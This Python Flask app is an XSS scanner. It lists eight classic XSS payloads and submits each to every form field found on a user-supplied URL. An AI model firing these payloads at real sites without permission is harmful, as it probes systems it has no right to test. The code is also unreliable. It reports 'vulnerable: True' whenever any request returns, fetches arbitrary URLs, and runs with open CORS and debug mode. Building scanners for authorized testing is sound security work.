import requests
from flask import Flask, request, jsonify, render_template
from flask_cors import CORS
from bs4 import BeautifulSoup
import concurrent.futures

app = Flask(__name__)
CORS(app)

# Advanced XSS Payloads
xss_payloads = [
    "<script>alert('XSS')</script>",
    "'\"><script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "' onmouseover=alert('XSS') autofocus='",
    "<iframe src='javascript:alert(\"XSS\")'></iframe>",
    "<body onload=alert('XSS')>",
    "<details open ontoggle=alert('XSS')>"
]

@app.route('/')
def index():
    return render_template('index.html')

def find_input_fields(html):
    """
    Parses the HTML to extract input fields and associated forms.
    """
    soup = BeautifulSoup(html, 'html.parser')
    forms = soup.find_all('form')
    fields = []

    for form in forms:
        action = form.get('action', '')
        method = form.get('method', 'get').lower()

        inputs = form.find_all('input')
        for input_field in inputs:
            name = input_field.get('name')
            if name:
                fields.append({'name': name, 'action': action, 'method': method})
    
    return fields

def test_payload(url, method, field_name, action, payload):
    """
    Test a single payload for XSS vulnerability and return detailed results.
    """
    try:
        full_url = f"{url.rstrip('/')}/{action.lstrip('/')}"

        if method == 'get':
            params = {field_name: payload}
            response = requests.get(full_url, params=params, timeout=5)
        else:  # POST request
            data = {field_name: payload}
            response = requests.post(full_url, data=data, timeout=5)

        if response:
            is_vulnerable = payload in response.text
            return {
                "field": field_name,
                "payload": payload,
                "vulnerable": is_vulnerable,
                "response": response.text[:500]  # Limiting to 500 characters for readability
            }
    except requests.RequestException as e:
        return {
            "field": field_name,
            "payload": payload,
            "error": str(e)
        }

    return None

@app.route('/scan_xss', methods=['POST'])
def scan_xss():
    """
    Endpoint to scan for XSS vulnerabilities.
    """
    data = request.get_json()
    target_url = data.get('url')

    try:
        response = requests.get(target_url, timeout=10)
        input_fields = find_input_fields(response.text)

        results = []

        with concurrent.futures.ThreadPoolExecutor() as executor:
            future_to_payload = []
            for input_field in input_fields:
                for payload in xss_payloads:
                    future_to_payload.append(
                        executor.submit(
                            test_payload,
                            target_url,
                            input_field['method'],
                            input_field['name'],
                            input_field['action'],
                            payload
                        )
                    )

            for future in concurrent.futures.as_completed(future_to_payload):
                result = future.result()
                if result:
                    results.append(result)

        if not results:
            return jsonify({
                "vulnerable": False,
                "message": "Vulnerability not found."
            })

        return jsonify({
            "vulnerable": True,
            "results": results
        })

    except Exception as e:
        return jsonify({"error": str(e)})

if __name__ == '__main__':
    app.run(debug=True,port=5002)
